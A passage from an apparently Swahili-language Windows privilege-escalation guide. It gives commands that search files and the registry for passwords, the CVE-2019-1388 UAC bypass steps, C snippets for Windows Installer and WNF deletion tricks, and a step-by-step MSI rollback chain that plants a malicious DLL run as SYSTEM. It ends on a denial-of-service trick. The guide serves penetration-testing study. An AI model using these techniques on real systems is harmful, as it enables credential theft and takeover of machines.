### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)**, na kila kipengele hufichua utendaji kupitia interface moja au zaidi, zinazotambuliwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry child **InProcServer32**, iliyo na **thamani chaguomsingi** inayoelekeza kwenye **DLL**, na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Vivinjari - COM DLL Overwriting: Ndani ya CLSIDs za registry hii unaweza kupata registry child InProcServer32, iliyo na thamani chaguomsingi inayoelekeza kwenye DLL na thamani...](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **kubadilisha DLL zozote** zitakazoendeshwa, unaweza **kupandisha mamlaka** ikiwa DLL hiyo itaendeshwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama mbinu ya persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa Jumla wa Password kwenye faili na registry**

**Tafuta maudhui ya faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina maalum**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya funguo na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoiunda ili **kutekeleza kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **nywila** za zana kadhaa zinazohifadhi data hii kama maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) wenye **ufikiaji kamili**. Mchakato huohuo **pia huunda mchakato mpya** (`CreateProcess()`) **wenye ruhusa za chini, lakini unaorithi handles zote zilizo wazi za mchakato mkuu**.\
Kisha, ikiwa una **ufikiaji kamili wa mchakato wenye ruhusa za chini**, unaweza kuchukua **handle iliyo wazi ya mchakato wenye ruhusa za juu ulioundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili jingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia vibaya handles zaidi zilizo wazi za process na thread zinazorithiwa zikiwa na viwango tofauti vya ruhusa (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zilizoshirikiwa, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya michakato.

Windows hutoa kipengele kinachoitwa **Named Pipes**, kinachowezesha michakato isiyohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, wenye majukumu yanayofafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **mchakato wenye ruhusa za juu** unaowasiliana kupitia pipe unayoweza kuiga kunakupa nafasi ya **kupata ruhusa za juu zaidi** kwa kujifanya kuwa mchakato huo unapoingiliana na pipe uliyounda. Kwa maelekezo ya kutekeleza shambulio hili, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, zana ifuatayo hukuruhusu **kunasa mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii hukuruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server huweka wazi `\\pipe\\tapsrv` (MS-TRP). Client aliyeingia kwa uthibitishaji kupitia mtandao anaweza kutumia vibaya njia ya matukio ya async inayotegemea mailslot na kubadilisha `ClientAttach` kuwa **uandishi wa byte 4** kwenye faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuiandikia, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mchakato kamili:

- `ClientAttach` ikiwa `pszDomainUser` imewekwa kuwa njia iliyopo inayoweza kuandikiwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` kwenda kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata matukio kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima huduma ili kurudia uandishi kwa njia thabiti.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiweka njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### Viendelezi vya faili vinavyoweza kutekeleza vitu katika Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia vichakataji vya Markdown

Viungo vya Markdown vinavyoweza kubofya na kutumwa kwa `ShellExecuteExW` vinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia mistari ya amri ili kutafuta nywila**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au michakato mingine inayoendeshwa ambayo **hupitisha credentials kwenye mstari wa amri**. Script iliyo hapa chini hunasa mistari ya amri ya michakato kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali iliyotangulia, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba manenosiri kutoka kwa michakato

## Kutoka kwa mtumiaji mwenye haki za chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.

Hii huwezesha kuongeza haki na kukwepa UAC kwa wakati mmoja kwa kutumia udhaifu huo huo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili kutumia udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika kwenye hazina hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka kiwango cha uadilifu cha Medium cha Administrator hadi High / UAC Bypass

Soma hili ili **kujifunza kuhusu viwango vya uadilifu**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili kujifunza kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuingiza Junctions za Saraka kwenye Root Inayotolewa

Programu inaweza kuunda saraka ndogo ya upakiaji yenye jina linalotabirika, kuandika humo jina la faili lililotolewa na mtumiaji, kisha kulichakata faili hilo. Ikiwa mtumiaji mwenye haki chache anaweza kufuta na kubadilisha saraka hiyo ndogo kwa NTFS junction kabla ya uandishi unaofanywa upande wa seva, uandishi unaweza kufuata junction hadi kwenye saraka inayotolewa na seva ya wavuti. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa huduma ya wavuti ikiwa seva inaendesha aina hiyo ya faili. Huu ni mpaka wa uandishi holela unaotegemea programu mahususi; saraka ya upakiaji inayoweza kuandikwa au junction iliyopo pekee havithibitishi uwezekano huo.

Kagua ujenzi halisi wa njia na muda wake katika handler ya upakiaji, haki halisi za mtumiaji za kufuta/kuunda saraka ndogo, ACLs halisi za lengwa, iwapo programu inayoandika hufuata reparse points, na iwapo seva ya wavuti huendesha faili katika saraka hiyo ya lengwa. Thibitisha utambulisho wa mchakato wa programu inayoandika na wa seva ya wavuti kando. Ukaguzi usioingilia mfumo unaweza kuonyesha ACLs za saraka na metadata ya reparse, lakini hauwezi kuthibitisha tabia ya handler au ubadilishaji wa junction utakaofanyika baadaye. Ikiwa utekelezaji unafanyika chini ya akaunti ya huduma, kagua **token halisi ya mchakato** kabla ya kuzingatia njia tofauti ya kutumia haki za token.

## Usafishaji wa kazi zilizopangwa zenye upendeleo unaochochewa na WNF

Kazi iliyopangwa inayokataa kuendeshwa mwenyewe bado inaweza kufichua kichocheo kinachopatikana kwa mtumiaji asiye na upendeleo. Unapokagua kazi yenye upendeleo, hamisha XML yake na kagua **vichocheo vyote**, pamoja na DACL ya kazi, principal na action. Hasa, `WnfStateChangeTrigger` hutaja hali ya Windows Notification Facility (WNF); ikiwa hali hiyo inayoweza kulindwa inaruhusu mtumiaji wa sasa kuchapisha sasisho, mtumiaji anaweza kuanzisha kazi hiyo kwa njia isiyo ya moja kwa moja chini ya utambulisho wake uliosanidiwa licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, kazi ya Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ilikubali masasisho ya hali ya WNF `7508BCA32C079E41` kutoka kwa mtumiaji wa kawaida, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata Recall ikiwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kupima ufikikaji, tafuta `ZwUpdateWnfStateData` kutoka `ntdll.dll`, tuma sasisho tupu kwa jina la hali la baiti nane, kisha linganisha hali ya urejeshaji na data ya mara ya mwisho kazi ilipoendeshwa au shughuli za Procmon. Probe ifuatayo iliyopunguzwa hutumia mfuatano wa baiti kutoka kwenye mfano wa kazi ya Recall; badilisha baiti hizo kwa zile zilizohamishwa kutoka kwenye kazi inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha usafishaji unaojirudia kuwa ufutaji wenye privileges

Primitive muhimu si trigger pekee, bali ni routine ya cleanup yenye privileges inayokubali directory inayodhibitiwa na mshambuliaji. Fuatilia operesheni kuanzia enumeration hadi mabadiliko ya mwisho: ugunduzi wa profile/session, children waliochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria dhabiti kwamba pathname iliyokaguliwa awali itafuatwa kwa recursive traversal baadaye. Ikiwa descendants hazifunguliwi kwa kutumia trusted directory handles na kuthibitishwa kabla ya kufutwa, mshambuliaji anaweza kubadilisha jinsi path inavyotatuliwa kati ya enumeration na matumizi yake.<sup>[[43]](#references)</sup>

Unganisha WNF trigger na [oplock, junction na Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) iliyoelezwa hapa chini: oplock husimamisha cleaner baada ya kuchagua child halali, huku ancestor inayoweza kuandikwa ikibadilishwa ili ufutaji wa privileged unapoendelea utatue path kupitia `\RPC Control` hadi kwenye target iliyolindwa. Katika mnyororo wa Recall, hii ilisababisha ufutaji wa `C:\Config.Msi` na SYSTEM, uliohitajika kwa mbinu ya MSI rollback iliyoandikwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Descendants zilizopachikwa hupita ukaguzi dhaifu wa reparse point

Kuthibitisha tu root inayodhibitiwa na mshambuliaji na child wake wa moja kwa moja hakulindi ufutaji wa recursive unaotumia pathname. Acha objects hizo zilizokaguliwa zibaki halali, kisha hamishia junction/oplock substitution kwenye child nyingine iliyo chini yake; hatimaye `IFileOperation::DeleteItem` itafikia descendant ambayo haijathibitishwa na kufuata target yake mpya. CVE-2026-20941 ilitokana hasa na aina hii ya fix isiyokamilika baada ya patch ya kwanza ya Recall kuthibitisha `UKP` na directory yenye umbo la GUID lakini ikaacha operesheni ya zamani ya recursive deletion.<sup>[[43]](#references)</sup>

Muundo salama ni kufungua **kila descendant** kuhusiana na directory handle ambayo tayari inaaminika, kupata na kuthibitisha path/object ya mwisho iliyotatuliwa, kisha kutumia deletion disposition kwenye handle hiyo iliyothibitishwa. Usithibitishe prefix kisha urudi kwenye recursive path-based deletion. Wakati wa kukagua patch, kagua pia structures kwenye call site halisi: katika kisa hiki, ukaguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo null na jina relative la `{GUID}\\secure_file.lock`, hivyo ukakanusha matokeo ya decompiler yaliyopotosha yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Kutoka Kufuta/Kuhamisha/Kubadilisha Jina Folda Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili linatumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali kwa faili hasidi wakati wa mchakato wa uninstallation. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer hasidi** itakayotumika kuteka folda ya `C:\Config.Msi`, ambayo Windows Installer itaitumia baadaye kuhifadhi faili za rollback wakati wa kuondoa MSI packages nyingine; faili hizo za rollback zitakuwa zimebadilishwa ili ziwe na payload hasidi.

### Uingizaji wa njia ya cleanup ya Windows Installer COM (CVE-2025-27727)

Client mwenye privileges za chini anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia COM object ya `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilibaini kuwa calls husika za `IMsiServer` ni `MsiBeginTransactionW` kwenye vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na offsets hizi zimetokana na reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji asiye administrator, `SetEEUIDirectoryAndFilter` hu-impersonate caller wakati tu inapofungua path iliyotolewa kwa kutumia `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hii inathibitisha kwamba caller anaweza kufuta directory na huepuka kufuata reparse point, lakini **haihusishi** file object iliyokaguliwa na cleanup ya baadaye, wala kuthibitisha kwamba Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` hupanga path kama folder bila kujali argument ya filter ya caller. Huduma huandika value yenye jina maalum ya `REG_DWORD` chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la value ni path inayodhibitiwa na caller na data `0x00000002` ni flag ya folder. Kisha `CleanupTempPackages(NULL, FALSE)` huanzisha cleanup moja kwa moja. Worker wake aliye na elevated privileges huorodhesha registry values na kupitisha entries za folder kwa `FDeleteFolder` ya recursive bila kuangalia asili ya path. Kuondoa kwa kawaida kukishindwa, code pia huita `LockdownPath`, huondoa file attributes, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa calls uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive muhimu ni kutumia tena path badala ya kuelekeza upya kwa junction. Sajili `C:\Config.Msi` iliyoundwa na mshambulizi, iondoe, kisha Windows Installer iunde tena pathname hiyo hiyo ikiwa na data ya rollback iliyolindwa. Usafishaji huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hukwepa mpaka uliokusudiwa na `FILE_FLAG_OPEN_REPARSE_POINT` pamoja na uzuiaji wa uaminifu wa redirection, kwa sababu reparse point haihitajiki.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa kwenye mnyororo wa rollback hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, kisha uweke wazi handle yenye ruhusa ya `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa mapema inaweza kurejesha DACL inayoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha tatizo la path kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` kuita `ScheduleFileOrFolderDelete` kipengele kipya cha udhibiti kinapowashwa. COM call bado inaweza kurudisha mafanikio, lakini haiweki tena path inayodhibitiwa na mshambulizi kwenye `TempPackages`. Sakinisha masasisho ya usalama ya Windows ya Aprili 2025 badala ya kutumia mafanikio ya matokeo ya method kama kipimo cha kiraka.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu iliyofupishwa ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Utekaji (acha `C:\Config.Msi` ikiwa tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folder inayoweza kuandikika (`TARGETDIR`).
    - Weka alama ya **"UAC Compliant"** kwa installer ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** wazi kwa faili baada ya usakinishaji.

- Hatua ya 2: Anza Kuondoa Usakinishaji
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa kuondoa usakinishaji huanza kuhamisha faili kwenda `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (nakala rudufu za rollback).
    - **Fuatilia handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kubaini faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Ulandanishi Maalum
    - `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara baada ya `.rbf` kuandikwa.
        - Kisha **husubiri** tukio jingine kabla ya kuendelea na uondoaji wa usakinishaji.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitolewa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia faili kufutwa**.
    - Kisha **tuma ishara ya kurudisha** ili uondoaji wa usakinishaji ukamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambulizi) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` haina kitu**, na iko tayari kutekwa.

> Katika hatua hii, **anzisha udhaifu wa kufuta folder kiholela kwa kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Badilisha Script za Rollback kwa Zenye Madhara**

- Hatua ya 6: Unda Tena `C:\Config.Msi` ikiwa na ACL dhaifu
    - Unda tena folder ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Kigezo kinachosababisha hitilafu ya kulazimishwa.
    - Usakinishaji huu utatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itokee.
    - Hifadhi jina lake la faili.

- Hatua ya 9: Landanisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa ishara ya tukio `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL dhaifu
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACL hutekelezwa **tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` script **bandia ya rollback** inayoelekeza Windows:
        - Kurejesha faili yako ya `.rbf` (DLL yenye madhara) kwenye **mahali penye ruhusa za juu** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia yenye **DLL payload yenye madhara ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya ulandanishi ili installer iendelee.
    - **Custom action ya aina ya 19 (`ErrorOut`)** imewekwa **kufanya usakinishaji ushindwe kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako yenye madhara.
        - Hunakili DLL yako ya `.rbf` kwenye mahali lengwa.
    - Sasa una **DLL yako yenye madhara kwenye path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Msimbo wa SYSTEM
    - Endesha **binary inayoaminika inayopata ruhusa za juu kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyoiteka.
    - **Bum**: Msimbo wako unatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Kuhamisha/Kubadilisha Jina kwa Faili Kiholela hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotajwa hapo awali) inadhania kuwa unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu tu **kufuta faili kiholela**?

Unaweza kutumia **mambo ya ndani ya NTFS**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Mtiririko huu huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta mtiririko wa `::$INDEX_ALLOCATION` wa folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama vile:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kuanzia Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Je, ikiwa primitive yako hairuhusu kufuta files/folders zozote, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** mchakato wenye privileged unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu hukagua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock huwashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` hadi mahali pengine
    - Hii huondoa yaliyomo kwenye `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** ndani ya `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga mkondo wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Uundaji wa Folda Mahali Popote hadi DoS ya Kudumu

Tumia primitive inayokuwezesha **kuunda folda mahali popote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **driver muhimu ya Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiitengeneza mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
